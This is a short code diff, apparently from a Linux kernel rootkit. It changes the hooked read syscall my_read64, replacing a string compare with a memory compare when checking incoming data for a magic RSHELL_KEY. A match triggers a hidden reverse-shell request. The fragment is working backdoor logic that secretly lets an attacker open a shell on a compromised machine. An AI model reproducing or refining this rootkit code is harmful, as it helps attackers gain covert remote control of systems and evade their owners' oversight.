@@ -123,7 +123,7 @@ asmlinkage int my_read64(int fd, void *buf, size_t len) {
 		if (nread >= 0) {
 			f_printk("recvfrom %d bytes\n", nread);
 		}
-		if (nread == sizeof(RSHELL_KEY) - 1 && f_strncmp(ubuf, RSHELL_KEY, nread) == 0) {
+		if (nread == sizeof(RSHELL_KEY) - 1 && f_memcmp(ubuf, RSHELL_KEY, nread) == 0) {
 			f_printk("GOT RSHELL REQUEST\n");
 			// empty buffer
 			nread = SYSCALL64(__NR_recvfrom, fd, ubuf, sizeof(RSHELL_KEY) - 1, 0, 0, 0);
